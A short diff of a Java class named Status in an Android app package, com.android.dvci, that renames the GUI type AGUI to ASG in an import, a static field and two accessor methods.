@@ -25,7 +25,7 @@ import com.android.dvci.conf.ConfEvent;
 import com.android.dvci.conf.ConfModule;
 import com.android.dvci.conf.Globals;
 import com.android.dvci.event.BaseEvent;
-import com.android.dvci.gui.AGUI;
+import com.android.dvci.gui.ASG;
 import com.android.dvci.module.ModuleCrisis;
 import com.android.dvci.util.Check;
 
@@ -102,7 +102,7 @@ public class Status {
 	/** The singleton. */
 	private volatile static Status singleton;
 
-	private static AGUI gui;
+	private static ASG gui;
 
 	/**
 	 * Self.
@@ -171,12 +171,12 @@ public class Status {
 		return context;
 	}
 
-	public static void setAppGui(AGUI applicationContext) {
+	public static void setAppGui(ASG applicationContext) {
 		setAppContext(applicationContext.getAppContext());
 		Status.gui = applicationContext;
 	}
 
-	public static AGUI getAppGui() {
+	public static ASG getAppGui() {
 		return gui;
 	}
 
